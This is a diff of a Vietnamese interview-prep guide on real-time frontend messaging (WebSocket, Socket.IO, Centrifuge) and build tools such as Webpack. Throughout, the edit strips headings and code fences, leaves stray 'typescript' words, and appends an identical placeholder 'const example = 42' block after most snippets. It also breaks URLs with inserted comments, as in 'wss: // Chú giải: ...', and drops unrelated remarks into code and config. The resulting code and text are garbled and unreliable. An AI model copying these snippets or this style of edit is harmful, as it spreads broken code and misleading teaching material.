-- **Auto-reconnect** khi connection lost
-- **Fallback mechanisms**: WebSocket → HTTP long-polling (nếu WS blocked)
-- **Rooms & Namespaces**: Organize connections (chat rooms, user-specific channels)
-- **Broadcasting**: Send message to all/specific clients
-- **Event-based API**: `socket.emit('event', data)` - cleaner than raw messages
-
-**3. Centrifuge (Scalable Pub/Sub):**
-- **Horizontal scaling** - multiple server instances share state via **Redis**
-- **Channel subscriptions**: Client subscribe channels, server publish to channels
-- **Presence**: Track online users in channels
-- **History**: Replay missed messages (offline → online)
-- Use case: Large-scale systems (>10k concurrent connections)
-
-**⚠️ Lỗi Thường Gặp:**
-- Không handle reconnection → connection lost = app broken
-- Send large payloads → slow, dùng binary (ArrayBuffer) thay JSON
-- Không authenticate WS connections → security risk
-- Memory leak: không cleanup event listeners khi disconnect
-
-**💡 Kiến Thức Senior:**
-- **WebSocket vs SSE**: SSE = server → client only (simpler), WS = bidirectional
-- **Heartbeat/Ping-Pong**: Detect dead connections (send ping every 30s, expect pong)
-- **Binary frames**: `ws.send(arrayBuffer)` nhanh hơn JSON strings (~40%)
-- **Backpressure**: Client slow consume → buffer overflow, implement flow control
-- **Load balancing**: Sticky sessions (same client → same server) or Redis pub/sub share state
-
-**⚡ Quick Summary:**
-> WebSocket = persistent connection, real-time bidirectional communication. Socket.IO = WebSocket + fallback + rooms. Centrifuge = scalable real-time messaging với Redis
-
-**💡 Ghi Nhớ:**
-- 🌐 **WebSocket**: Native browser API, low-level, persistent TCP connection
-- 🔌 **Socket.IO**: High-level library, auto-reconnect, fallback to polling
-- 📡 **Centrifuge**: Enterprise solution, horizontal scaling, Redis pub/sub
-- ⚡ **Use Case**: Trading (real-time price), Chat, Live dashboard, Notifications
-
-**Trả lời:**
-
-#### **Phần 1: WebSocket Basics**
-
-**💡 WebSocket là gì?**
-
-WebSocket là giao thức **persistent, bidirectional** communication giữa client và server qua **single TCP connection**.
-
-**Tại sao dùng WebSocket thay vì REST API Polling?**
-
-```typescript
+typescript
 // ❌ REST API Polling - KHÔNG hiệu quả
 setInterval(() => {
   fetch('/api/market-data')
@@ -28583,9 +17828,9 @@ const ws = new WebSocket('wss: // Chú giải: market-data.example.com');
 ws.onopen = () => {
   console.log('✅ Connected');
  // Chú giải: Subscribe to channels
-  ws.send(JSON.stringify({ 
-    type: 'subscribe', 
-    symbols: ['VNM', 'HPG', 'VIC'] 
+  ws.send(JSON.stringify({
+    type: 'subscribe',
+    symbols: ['VNM', 'HPG', 'VIC']
   }));
 };
 
@@ -28602,11 +17847,13 @@ ws.onmessage = (event) => {
  * ✅ Server load thấp: Chỉ push khi có data mới
  * ✅ True real-time: Không có polling delay
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**WebSocket Lifecycle:**
-
-```typescript
+typescript
  // Chú giải: 1. CONNECTING (readyState = 0)
 const ws = new WebSocket('wss: // Chú giải: api.example.com/stream');
 console.log('State:', ws.readyState); // Chú giải: 0 - CONNECTING
@@ -28615,11 +17862,11 @@ console.log('State:', ws.readyState); // Chú giải: 0 - CONNECTING
 ws.onopen = () => {
   console.log('State:', ws.readyState); // Chú giải: 1 - OPEN
   console.log('✅ Connected, có thể gửi message');
-  
+
  // Chú giải: Send subscribe message
-  ws.send(JSON.stringify({ 
-    type: 'subscribe', 
-    symbols: ['BTCUSDT', 'ETHUSDT'] 
+  ws.send(JSON.stringify({
+    type: 'subscribe',
+    symbols: ['BTCUSDT', 'ETHUSDT']
   }));
 };
 
@@ -28627,7 +17874,7 @@ ws.onopen = () => {
 ws.onmessage = (event: MessageEvent) => {
   const data = JSON.parse(event.data);
   console.log('📥 Received:', data);
-  
+
  // Chú giải: Update UI
   updateTickerPrice(data.symbol, data.price);
 };
@@ -28643,7 +17890,7 @@ ws.onclose = (event: CloseEvent) => {
   console.log('State:', ws.readyState); // Chú giải: 3 - CLOSED
   console.log('Code:', event.code);
   console.log('Reason:', event.reason);
-  
+
   /**
    * CLOSE CODES:
    * 1000: Normal closure
@@ -28652,7 +17899,7 @@ ws.onclose = (event: CloseEvent) => {
    * 1008: Policy violation (auth error)
    * 1011: Server error
    */
-  
+
  // Chú giải: Reconnect logic
   if (shouldReconnect(event.code)) {
     scheduleReconnect();
@@ -28662,27 +17909,25 @@ ws.onclose = (event: CloseEvent) => {
  // Chú giải: Cleanup khi unmount
 useEffect(() => {
   const ws = new WebSocket(url);
-  
+
   return () => {
     ws.close(1000, 'Component unmounted'); // Chú giải: ✅ Clean close
   };
 }, [url]);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 2: Production WebSocket Architecture**
-
-**Pattern 1: Reference Counting Subscription Manager**
-
-```typescript
+typescript
 /**
  * PROBLEM: Multiple components subscribe to same symbol
- * 
+ *
  * Component A: Subscribe VNM
  * Component B: Subscribe VNM
  * Component C: Subscribe HPG
- * 
+ *
  * ❌ BAD: 3 WebSocket connections (waste resources)
  * ✅ GOOD: 1 connection, reference counting
  */
@@ -28708,7 +17953,7 @@ class LiveDataManager {
           count: 1,
           subscribers: new Set([componentId])
         });
-        
+
         this.ws?.send(JSON.stringify({
           type: 'subscribe',
           symbol
@@ -28717,7 +17962,7 @@ class LiveDataManager {
  // Chú giải: ⚡ Already subscribed → Just increment counter
         current.count++;
         current.subscribers.add(componentId);
-        
+
         // Không gửi subscribe message nữa!
       }
     });
@@ -28734,7 +17979,7 @@ class LiveDataManager {
         if (data.count === 0) {
  // Chú giải: 🗑️ No more subscribers → Unsubscribe
           this.tracker.delete(symbol);
-          
+
           this.ws?.send(JSON.stringify({
             type: 'unsubscribe',
             symbol
@@ -28747,7 +17992,7 @@ class LiveDataManager {
 
 /**
  * TIMELINE EXAMPLE:
- * 
+ *
  * Time | Event                    | VNM count | Action
  * -----|--------------------------|-----------|------------------
  * T0   | Component A mounts       | 0 → 1     | ✅ Send subscribe
@@ -28757,11 +18002,13 @@ class LiveDataManager {
  * T4   | Component B unmounts     | 2 → 1     | ✋ Keep connection
  * T5   | Component C unmounts     | 1 → 0     | 🗑️ Unsubscribe, close
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Pattern 2: Zustand Store Integration**
-
-```typescript
+typescript
  // Chú giải: File: lib/live-data-manager/stores/useLiveDataStore.ts
 
 interface TickerData {
@@ -28780,7 +18027,7 @@ interface LiveDataStore {
 
 const useLiveDataStore = create<LiveDataStore>((set) => ({
   tickerData: {},
-  
+
  // Chú giải: Update single ticker
   updateTickerData: (data) => set((state) => ({
     tickerData: {
@@ -28788,7 +18035,7 @@ const useLiveDataStore = create<LiveDataStore>((set) => ({
       [data.symbol]: data
     }
   })),
-  
+
  // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
   batchUpdate: (updates) => set((state) => {
     const newData = { ...state.tickerData };
@@ -28802,7 +18049,7 @@ const useLiveDataStore = create<LiveDataStore>((set) => ({
  // Chú giải: WebSocket message handler
 ws.onmessage = (event) => {
   const data = JSON.parse(event.data);
-  
+
   if (Array.isArray(data)) {
  // Chú giải: Batch update
     useLiveDataStore.getState().batchUpdate(data);
@@ -28811,11 +18058,13 @@ ws.onmessage = (event) => {
     useLiveDataStore.getState().updateTickerData(data);
   }
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Pattern 3: React Hook Integration**
-
-```typescript
+typescript
  // Chú giải: File: lib/live-data-manager/hooks/useLiveMarketData.ts
 
 const useLiveMarketData = () => {
@@ -28888,15 +18137,13 @@ const StockWatchlist = () => {
     </div>
   );
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 3: Performance Optimization**
-
-**Optimization 1: Throttling với requestAnimationFrame**
-
-```typescript
+typescript
 /**
  * PROBLEM: Nhận 1000 updates/giây từ WebSocket
  * SOLUTION: Throttle UI updates với requestAnimationFrame (60fps)
@@ -28930,7 +18177,7 @@ const useThrottledWebSocket = () => {
  // Chú giải: WebSocket message handler
   const onMessage = useCallback((event: MessageEvent) => {
     const parsed = JSON.parse(event.data);
-    
+
     // ⚡ Chỉ store data, KHÔNG update state ngay
     // Đợi RAF cycle tiếp theo
     latestDataRef.current = parsed;
@@ -28944,11 +18191,13 @@ const useThrottledWebSocket = () => {
  * ❌ Before: 1000 updates/giây → Lag UI, high CPU
  * ✅ After: 60 updates/giây → Smooth, low CPU
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Optimization 2: Selective Re-rendering**
-
-```typescript
+typescript
  // Chú giải: ❌ BAD: Update entire store → All components re-render
 const useLiveDataStore = create((set) => ({
   tickers: {},
@@ -28977,14 +18226,16 @@ const StockRow = ({ symbol }) => {
   // ✅ Chỉ re-render khi symbol này update
   // ❌ Không re-render khi symbols khác update
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Optimization 3: Virtual Scrolling**
-
-```typescript
+typescript
  // Chú giải: ❌ BAD: Render all 1000 rows
 const Watchlist = ({ data }) => {
-  return data.map(item => <StockRow data={item} />); 
+  return data.map(item => <StockRow data={item} />);
  // Chú giải: 1000 DOM nodes → Slow render, high memory
 };
 
@@ -29013,11 +18264,13 @@ const Watchlist = ({ data }) => {
  * ❌ No virtual scrolling: 1000 rows → 500ms render
  * ✅ Virtual scrolling: 20 rows → 16ms render (60fps)
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Optimization 4: Batch Updates**
-
-```typescript
+typescript
  // Chú giải: ❌ BAD: Update từng ticker một
 ws.onmessage = (event) => {
   const data = JSON.parse(event.data);
@@ -29043,15 +18296,13 @@ ws.onmessage = (event) => {
 };
 
  // Chú giải: 100 updates → 1 batch update → 1 re-render
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 4: Error Handling & Reconnection**
-
-**Exponential Backoff Reconnection:**
-
-```typescript
+typescript
 class ResilientWebSocket {
   private ws: WebSocket | null = null;
   private url: string;
@@ -29136,7 +18387,7 @@ class ResilientWebSocket {
 
   subscribe(symbols: string[]) {
     this.activeSubscriptions = [...new Set([...this.activeSubscriptions, ...symbols])];
-    
+
     if (this.ws?.readyState === WebSocket.OPEN) {
       this.ws.send(JSON.stringify({
         type: 'subscribe',
@@ -29157,7 +18408,7 @@ class ResilientWebSocket {
 
 /**
  * RECONNECTION TIMELINE:
- * 
+ *
  * T0: Connection lost
  * T0 + 1s: Attempt 1 (baseDelay * 2^0)
  * T0 + 3s: Attempt 2 (baseDelay * 2^1 = 2s)
@@ -29165,11 +18416,13 @@ class ResilientWebSocket {
  * T0 + 15s: Attempt 4 (baseDelay * 2^3 = 8s)
  * T0 + 31s: Attempt 5 (baseDelay * 2^4 = 16s) - Final
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Connection Status UI:**
-
-```typescript
+typescript
 const ConnectionStatus = () => {
   const [status, setStatus] = useState<'connected' | 'connecting' | 'disconnected'>('connecting');
   const [reconnectAttempt, setReconnectAttempt] = useState(0);
@@ -29223,18 +18476,16 @@ const ConnectionStatus = () => {
     </div>
   );
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 5: Socket.IO - High-Level WebSocket Library**
-
-**Socket.IO Features:**
-
-```typescript
+typescript
 /**
  * SOCKET.IO = WebSocket + Fallback + Rooms + Auto-reconnect + Binary support
- * 
+ *
  * ✅ Advantages:
  * - Auto-reconnection with exponential backoff
  * - Fallback to HTTP long-polling (IE11, corporate firewalls)
@@ -29242,7 +18493,7 @@ const ConnectionStatus = () => {
  * - Acknowledgements (confirm message received)
  * - Binary support (images, files)
  * - Broadcasting
- * 
+ *
  * ❌ Disadvantages:
  * - Heavier than native WebSocket (~50KB)
  * - Not compatible with standard WebSocket servers
@@ -29258,13 +18509,13 @@ const socket = io('https: // Chú giải: api.example.com', {
   reconnectionDelay: 1000,
   reconnectionDelayMax: 5000,
   reconnectionAttempts: 5,
-  
+
  // Chú giải: Timeout
   timeout: 20000,
-  
+
  // Chú giải: Transports
   transports: ['websocket', 'polling'], // Chú giải: Try WebSocket first, fallback to polling
-  
+
  // Chú giải: Auth
   auth: {
     token: 'Bearer xyz123'
@@ -29305,11 +18556,13 @@ socket.emit('upload-chart', imageBlob);
 
  // Chú giải: Cleanup
 socket.disconnect();
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Server-side (Node.js):**
-
-```typescript
+typescript
 import { Server } from 'socket.io';
 
 const io = new Server(3000, {
@@ -29322,7 +18575,7 @@ const io = new Server(3000, {
  // Chú giải: Middleware - Authentication
 io.use((socket, next) => {
   const token = socket.handshake.auth.token;
-  
+
   if (isValidToken(token)) {
     next();
   } else {
@@ -29343,11 +18596,11 @@ io.on('connection', (socket) => {
  // Chú giải: Subscribe to symbols
   socket.on('subscribe', (data) => {
     const { symbols } = data;
-    
+
     symbols.forEach((symbol: string) => {
       socket.join(`ticker:${symbol}`);
     });
-    
+
  // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
     socket.emit('subscribed', { symbols });
   });
@@ -29355,7 +18608,7 @@ io.on('connection', (socket) => {
  // Chú giải: Broadcast ticker updates to room
   setInterval(() => {
     const tickerData = getLatestTicker('VNM');
-    
+
  // Chú giải: Send to all clients in room
     io.to('ticker:VNM').emit('ticker-update', tickerData);
   }, 1000);
@@ -29365,18 +18618,16 @@ io.on('connection', (socket) => {
     console.log('Client disconnected:', socket.id);
   });
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 6: Centrifuge - Enterprise Real-time Messaging**
-
-**Centrifuge Features:**
-
-```typescript
+typescript
 /**
  * CENTRIFUGE = Real-time messaging platform với horizontal scaling
- * 
+ *
  * ✅ Advantages:
  * - Horizontal scaling với Redis, KeyDB, Nats
  * - Channel subscription với permissions
@@ -29385,12 +18636,12 @@ io.on('connection', (socket) => {
  * - Token-based auth với expiration
  * - Binary support
  * - Multiple SDKs (JS, Go, Python, Java...)
- * 
+ *
  * ❌ Disadvantages:
  * - Complex setup (need Centrifugo server)
  * - Learning curve
  * - Overkill cho small apps
- * 
+ *
  * 🎯 Use Cases:
  * - Trading platforms (high throughput)
  * - Chat applications (presence, history)
@@ -29407,7 +18658,7 @@ const centrifuge = new Centrifuge('ws: // Chú giải: localhost:8000/connection
     const { token } = await response.json();
     return token;
   },
-  
+
  // Chú giải: Auto-resubscribe
   debug: true
 });
@@ -29422,22 +18673,22 @@ const subscription = centrifuge.subscribe('market:stocks', {
     console.log('New message:', ctx.data);
     updateTickerData(ctx.data);
   },
-  
+
  // Chú giải: On subscribe success
   subscribe: (ctx) => {
     console.log('✅ Subscribed to channel');
-    
+
  // Chú giải: Get presence (online users)
     subscription.presence().then(result => {
       console.log('Online users:', result.clients);
     });
-    
+
  // Chú giải: Get history (last messages)
     subscription.history({ limit: 100 }).then(result => {
       console.log('Message history:', result.publications);
     });
   },
-  
+
  // Chú giải: On unsubscribe
   unsubscribe: (ctx) => {
     console.log('🔌 Unsubscribed');
@@ -29459,11 +18710,13 @@ subscription.on('presence', (ctx) => {
  // Chú giải: Cleanup
 subscription.unsubscribe();
 centrifuge.disconnect();
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Server-side (Centrifugo):**
-
-```json
+json
  // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
 {
   "v3_use_offset": true,
@@ -29481,13 +18734,13 @@ centrifuge.disconnect();
     }
   ]
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 7: So Sánh WebSocket vs Socket.IO vs Centrifuge**
-
-```typescript
+typescript
 /**
  * ┌────────────────┬────────────────┬────────────────┬────────────────┐
  * │                │  WEBSOCKET     │  SOCKET.IO     │  CENTRIFUGE    │
@@ -29505,28 +18758,28 @@ centrifuge.disconnect();
  * │ Server         │ Any WS server  │ Socket.IO srv  │ Centrifugo     │
  * │ Use Case       │ Simple apps    │ Medium apps    │ Enterprise     │
  * └────────────────┴────────────────┴────────────────┴────────────────┘
- * 
+ *
  * 🎯 DECISION TREE:
- * 
+ *
  * Simple app, basic real-time (chat, notifications)
  *   → Native WebSocket
- * 
+ *
  * Need auto-reconnect, rooms, fallback (IE11 support)
  *   → Socket.IO
- * 
+ *
  * Enterprise, millions of connections, horizontal scaling
  *   → Centrifuge
- * 
+ *
  * Trading platform, high throughput, low latency
  *   → Centrifuge (with Redis/KeyDB)
  */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **Phần 8: Best Practices**
-
-```typescript
+typescript
 /**
  * ✅ DO:
  */
@@ -29534,7 +18787,7 @@ centrifuge.disconnect();
  // Chú giải: 1. Always cleanup WebSocket on unmount
 useEffect(() => {
   const ws = new WebSocket(url);
-  
+
   return () => {
     ws.close(1000, 'Component unmounted');
   };
@@ -29543,7 +18796,7 @@ useEffect(() => {
  // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
 const subscribe = (symbol: string) => {
   refCount[symbol] = (refCount[symbol] || 0) + 1;
-  
+
   if (refCount[symbol] === 1) {
     ws.send(JSON.stringify({ type: 'subscribe', symbol }));
   }
@@ -29594,80 +18847,12 @@ setTimeout(flushBatch, 16); // Chú giải: 60fps
 
  // Chú giải: 6. Don't use == for subscription checking
  // Chú giải: Use Set or Map!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
----
-## 46. ⚡ Q46: Build Tools - Vite vs Webpack vs Rollup, SWC vs Babel, Turbopack, esbuild  
-
-**P1: Tên câu hỏi:** ⚡ Q46: Build Tools - Vite vs Webpack vs Rollup, SWC vs Babel, Turbopack, esbuild  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"Công cụ build hiện đại chia làm 2 nhóm: Bundlers (đóng gói) và Transpilers (chuyển đổi code).**
-
-**📦 Bundlers - Công cụ đóng gói:**
-- **esbuild**: Nhanh nhất vì viết bằng Go, kiến trúc đơn giản (nhanh hơn Webpack 100 lần).
-- **Turbopack**: Công cụ thế hệ mới viết bằng Rust, hỗ trợ đa luồng và cache liên tục → cực nhanh cho ứng dụng lớn.
-- **Vite**: Máy chủ dev siêu nhanh (dùng ESM gốc + esbuild), production thì dùng Rollup để đóng gói.
-- **Webpack**: Lâu đời nhất, config phức tạp nhưng mạnh mẽ, phù hợp cho ứng dụng doanh nghiệp.
-- **Rollup**: Tốt nhất cho thư viện (ưu tiên ESM, tree-shaking loại bỏ code thừa tốt nhất).
-
-**⚙️ Transpilers - Công cụ chuyển đổi code:**
-- **Babel**: Hệ sinh thái lớn nhất, tương thích tốt nhất, nhưng chậm.
-- **SWC**: Viết bằng Rust, nhanh gấp 20 lần Babel, đang dần thay thế Babel.
-
-**🎯 Nên dùng công cụ nào:**
-- **Ứng dụng doanh nghiệp lớn** → Webpack (ổn định) hoặc Turbopack (tốc độ).
-- **Ứng dụng hiện đại/startup** → Vite (trải nghiệm dev tốt nhất).
-- **Thư viện/package** → Rollup (loại bỏ code thừa tốt nhất).
-- **Yêu cầu tốc độ cao** → esbuild để build, SWC để chuyển đổi.
-- **Dùng Next.js 13+** → Turbopack tích hợp sẵn.
-
-**⚠️ Đánh đổi chính:**
-- **Tốc độ vs Ổn định**: esbuild/Turbopack nhanh nhưng hệ sinh thái còn nhỏ.
-- **Dev vs Production**: Vite dev nhanh nhưng production dùng Rollup (không nhất quán).
-- **Plugin/mở rộng**: Webpack > Rollup > Vite > esbuild.
-
-**💡 Xu hướng hiện tại:**
-- Đang chuyển từ **công cụ JavaScript** (Webpack, Rollup) sang **công cụ native** (Rust/Go: SWC, esbuild, Turbopack).
-- **Vite đang thống trị** các dự án mới (Nuxt, SvelteKit, Astro đều dùng Vite).
-- **Next.js chuyển sang Turbopack** (thay thế Webpack).
-- **Công cụ JS chậm** vì chạy đơn luồng + bộ thu gom rác + mô hình bộ nhớ không phù hợp cho xử lý cây cú pháp."
-
----
-
-### **🔥 Điểm Nổi Bật Thể Hiện Trình Độ Senior:**
-
-1. **So sánh về kiến trúc:**
-   - "esbuild nhanh vì Go có goroutines (phân tích đồng thời nhiều file), Webpack chậm vì JavaScript chạy đơn luồng."
-   - "Turbopack dùng tính toán tăng dần + Rust → cache liên tục ngay cả khi restart."
-
-2. **Đánh đổi quan trọng:**
-   - "Vite dev nhanh (dùng ESM gốc) nhưng bundle production không nhất quán với môi trường dev."
-   - "esbuild thiếu tính năng như chia code nâng cao, hỗ trợ decorator."
-
-3. **Kinh nghiệm thực tế:**
-   - "Đã chuyển từ Webpack sang Vite, giảm thời gian build từ 2 phút xuống 20 giây."
-   - "Dùng SWC thay Babel cho monorepo, build nhanh hơn 30%."
-
-4. **Nhìn về tương lai:**
-   - "Đang theo dõi Turbopack vì Next.js áp dụng, nhưng chưa sẵn sàng production cho các app không dùng Next."
-   - "Rspack (Webpack viết lại bằng Rust) đang nổi lên như đối thủ của Turbopack."
-
----
-
-**❓ Câu Hỏi:**
-So sánh các build tools hiện đại (công cụ build): Vite, Webpack, Rollup, esbuild, Turbopack và transpilers (trình chuyển đổi code): SWC vs Babel. Khi nào nên dùng tool nào?
-
-
-#### **📊 Build Tools Ecosystem - Tổng Quan Hệ Sinh Thái Công Cụ Build**
-
-```
 ┌──────────────────────────────────────────────────────────────────────┐
 │                    BUILD TOOLS LANDSCAPE 2024                        │
 │                 (Bản Đồ Công Cụ Build Năm 2024)                     │
@@ -29695,103 +18880,13 @@ So sánh các build tools hiện đại (công cụ build): Vite, Webpack, Rollu
 │  │                  Như thông dịch viên AI siêu tốc               │ │
 │  └────────────────────────────────────────────────────────────────┘ │
 └──────────────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **1️⃣ SO SÁNH CÁC BUNDLERS (Công Cụ Đóng Gói)**
-
-**📊 Bảng So Sánh Hiệu Suất & Tính Năng:**
-
-| Tính Năng | **Webpack** | **Rollup** | **Vite** | **esbuild** | **Turbopack** |
-|---------|-------------|------------|----------|-------------|---------------|
-| **Tốc độ Dev** (Chạy dev server) | ⭐⭐ Chậm | ⭐⭐⭐ Trung bình | ⭐⭐⭐⭐⭐ Nhanh | ⭐⭐⭐⭐⭐ Nhanh nhất | ⭐⭐⭐⭐⭐ Nhanh nhất |
-| **Tốc độ Build** (Build production) | ⭐⭐ 10 giây | ⭐⭐⭐ 5 giây | ⭐⭐⭐⭐ 2 giây | ⭐⭐⭐⭐⭐ 0.5 giây | ⭐⭐⭐⭐⭐ 1 giây |
-| **Tree-shaking** (Loại bỏ code thừa) | ⭐⭐⭐ Tốt | ⭐⭐⭐⭐⭐ Tốt nhất | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Tốt |
-| **Code Splitting** (Chia nhỏ bundle) | ⭐⭐⭐⭐⭐ Tốt nhất | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐ Cơ bản | ⭐⭐⭐⭐ Tốt |
-| **HMR** (Hot Module Reload - Cập nhật nóng) | ⭐⭐⭐ Tốt | ⭐⭐ Chậm | ⭐⭐⭐⭐⭐ Tức thì | ❌ Không có | ⭐⭐⭐⭐⭐ Tức thì |
-| **Config** (Độ phức tạp cấu hình) | ⭐⭐ Phức tạp | ⭐⭐⭐⭐ Đơn giản | ⭐⭐⭐⭐⭐ Rất đơn giản | ⭐⭐⭐ Hạn chế | ⭐⭐⭐⭐ Đơn giản |
-| **Plugins** (Hệ sinh thái plugin) | ⭐⭐⭐⭐⭐ Khổng lồ | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Đang phát triển | ⭐⭐ Hạn chế | ⭐⭐ Mới |
-| **Bundle Size** (Kích thước file đóng gói) | ⭐⭐⭐ Tốt | ⭐⭐⭐⭐⭐ Nhỏ nhất | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Tốt | ⭐⭐⭐⭐ Tốt |
-| **Độ trưởng thành** | ⭐⭐⭐⭐⭐ 12 năm | ⭐⭐⭐⭐⭐ 9 năm | ⭐⭐⭐⭐ 4 năm | ⭐⭐⭐ 4 năm | ⭐⭐ 2 năm |
-| **Độ khó học** | ⭐⭐ Khó | ⭐⭐⭐⭐ Dễ | ⭐⭐⭐⭐⭐ Rất dễ | ⭐⭐⭐⭐ Dễ | ⭐⭐⭐ Trung bình |
-
----
-
-#### **🔹 A. Webpack - "Ông Già Giàu Kinh Nghiệm"**
-
-**💡 Tổng Quan:**
-- Bundler lâu đời nhất, cấu hình linh hoạt (12 năm tuổi - ra đời 2012)
-- Hệ sinh thái plugin khổng lồ (hàng ngàn plugins)
-- Dev server chậm, config phức tạp (có thể 500+ dòng)
-- Phù hợp nhất cho app lớn, phức tạp, enterprise
-
-**✅ Điểm Mạnh (Strengths):**
-1. **Trưởng Thành & Ổn Định**: 12 năm kiểm nghiệm, production-ready
-   - Mọi bugs đã được fix qua nhiều năm
-   - Hỗ trợ mọi edge cases
-   - Dùng bởi Facebook, Google, Microsoft
-
-2. **Hệ Sinh Thái Plugin Khổng Lồ**: Hàng ngàn plugins có sẵn
-   - Muốn gì cũng có plugin: CSS, images, fonts, WebAssembly
-   - Cộng đồng lớn, dễ tìm giải pháp
-
-3. **Code Splitting Nâng Cao**: Chiến lược chia nhỏ bundle phức tạp
-   - Dynamic imports: `import('./module').then(...)`
-   - Split by route, vendor, common chunks
-   - Tối ưu load time
-
-4. **Quản Lý Assets Toàn Diện**: Images, fonts, CSS, mọi thứ
-   - Import ảnh như module: `import logo from './logo.png'`
-   - Optimize images, fonts tự động
-   - CSS Modules, SASS, Less
-
-5. **Hỗ Trợ Rộng Rãi**: Làm việc với mọi framework
-   - React, Vue, Angular, Svelte, vanilla JS
-   - Có template cho tất cả
-
-**❌ Điểm Yếu (Weaknesses):**
-1. **Dev Server Chậm**: Bundle toàn bộ app khi start
-   - Cold start: ~10 giây (bundle hết 1000 files trước)
-   - Lần đầu chạy `npm start` → đợi lâu
-   - Không phù hợp cho rapid prototyping
-
-2. **Config Phức Tạp**: webpack.config.js có thể 500+ dòng
-   - Loaders, plugins, optimization rules
-   - Khó học cho beginners
-   - Dễ config sai → bugs khó debug
-
-3. **HMR Chậm**: Re-bundle lại khi thay đổi code
-   - Mỗi lần sửa code: 1-2 giây để cập nhật
-   - So với Vite (50ms) → cảm giác lag
-   - Developer experience không tốt
-
-4. **Bundle Size Lớn**: Nhiều runtime code thừa
-   - Webpack runtime + module system
-   - File output lớn hơn Rollup ~20-30%
-   - Page load chậm hơn
-
-**📌 Khi Nào Dùng Webpack:**
-- ✅ **App lớn của doanh nghiệp** (legacy codebases có sẵn)
-   - Đã dùng Webpack, không muốn migrate
-   - App phức tạp với nhiều requirements đặc biệt
-   
-- ✅ **Build phức tạp**: Cần config chi tiết
-   - Multi-page apps (MPA)
-   - Custom loaders, plugins đặc biệt
-   - Khi Vite/Rollup không đáp ứng được
-
-- ✅ **Cần plugin cụ thể**: Plugin chỉ có trên Webpack
-   - Module Federation (micro-frontends)
-   - Specialized loaders
-
-- ✅ **Migration từ dự án cũ**: Đang dùng Webpack rồi
-   - Chi phí migrate cao
-   - "If it ain't broken, don't fix it"
-
-**🔧 Ví Dụ Config (Webpack Configuration):**
-
-```javascript
+javascript
  // Chú giải: webpack.config.js
 const path = require('path');
 const HtmlWebpackPlugin = require('html-webpack-plugin');
@@ -29800,13 +18895,13 @@ const MiniCssExtractPlugin = require('mini-css-extract-plugin');
 module.exports = {
   mode: 'production', // Chế độ: 'development' hoặc 'production'
   entry: './src/index.tsx', // File đầu vào (entry point)
-  
+
   output: {
     path: path.resolve(__dirname, 'dist'), // Chú giải: Thư mục output
     filename: '[name].[contenthash].js', // Tên file output với hash (cache busting)
     clean: true, // Xóa thư mục dist cũ trước khi build
   },
-  
+
   // LOADERS - Xử lý các loại file khác nhau
   module: {
     rules: [
@@ -29829,7 +18924,7 @@ module.exports = {
       },
     ],
   },
-  
+
   // PLUGINS - Mở rộng chức năng Webpack
   plugins: [
     // Plugin 1: Tạo HTML file tự động
@@ -29842,7 +18937,7 @@ module.exports = {
       filename: '[name].[contenthash].css', // Tên file CSS với hash
     }),
   ],
-  
+
   // OPTIMIZATION - Tối ưu hóa bundle
   optimization: {
     splitChunks: {
@@ -29858,113 +18953,38 @@ module.exports = {
       },
     },
   },
-  
+
   // RESOLVE - Cấu hình cách resolve modules
   resolve: {
     extensions: ['.tsx', '.ts', '.js'], // Auto-resolve các extension này
     // import './App' → tự tìm App.tsx, App.ts, App.js
   },
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Hiệu Suất Thực Tế (Performance):**
-```
 Dev Server Start:  ~10 giây (cold start - lần đầu chạy)
-                   - Bundle toàn bộ app trước
-                   - Parse 1000+ files
-                   - Transform với Babel
-                   
+- Bundle toàn bộ app trước
+- Parse 1000+ files
+- Transform với Babel
+
 HMR:               ~1-2 giây (sau khi sửa code)
-                   - Re-bundle phần thay đổi
-                   - Inject vào browser
-                   
+- Re-bundle phần thay đổi
+- Inject vào browser
+
 Production Build:  ~10-30 giây (tuỳ kích thước app)
-                   - Minify, optimize, tree-shake
-                   - Generate source maps
+- Minify, optimize, tree-shake
+- Generate source maps
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
